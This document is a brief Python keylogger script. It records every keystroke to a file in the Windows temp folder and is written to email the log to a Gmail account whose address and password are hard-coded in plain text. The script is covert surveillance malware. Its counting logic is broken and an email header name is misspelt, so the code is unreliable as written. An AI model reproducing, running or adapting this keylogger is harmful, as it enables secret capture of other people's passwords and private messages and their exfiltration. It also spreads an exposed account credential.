from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path

log_dir = 'C:\Windows\Temp\\'
full_path_file = log_dir + 'K.txt'
logging.basicConfig(filename=(full_path_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#The mail addresses and password
sender_address = 'pyzapyza123@gmail.com'
sender_pass = 'JcdG6pX?HrAd5T4$'
receiver_address = 'pyzapyza123@gmail.com'

def OnPress(key):
    logging.info(str(key))

i=0
while i < 1001:
    with Listener(on_press = OnPress) as listener:
        listener.join()
    if i == 1000:
        mail_content = Path(full_path_file).read_text()
        #Setup the MIME
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'K'
        #The subject line
        #The body and the attachments for the mail
        message.attach(MIMEText(mail_content, 'plain'))
        attach_file_name = full_path_file
        attach_file = open(attach_file_name, 'r') # Open the file as Text mode
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload) #encode the attachment
        #add payload header with filename
        payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
        message.attach(payload)
        #Create SMTP session for sending the mail
        session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
        session.starttls() #enable security
        session.login(sender_address, sender_pass) #login with mail_id and password
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()
        i=0
